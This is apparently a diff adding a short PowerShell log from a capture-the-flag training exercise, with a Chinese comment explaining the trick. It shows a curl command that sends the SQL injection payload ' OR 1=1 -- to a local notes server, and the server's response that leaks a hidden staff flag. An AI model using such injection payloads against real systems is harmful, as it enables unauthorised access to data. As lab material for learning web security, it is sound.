@@ -1,0 +1,10 @@
+# 注入：闭合引号 + 恒真条件 + 注释尾部（PowerShell 单引号字符串内的单引号要写两个）
+PS C:\Users\mzj\Desktop\CTF\CTF-training-problem-first-full> curl.exe -s -i -G --data-urlencode 'title='' OR 1=1 -- ' http://127.0.0.1:8765/notes
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.12.10
+Date: Sat, 26 Sep 2026 03:20:29 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 82
+
+public: Try searching for a note by its title.
+staff: flag{sql_parameters_matter}
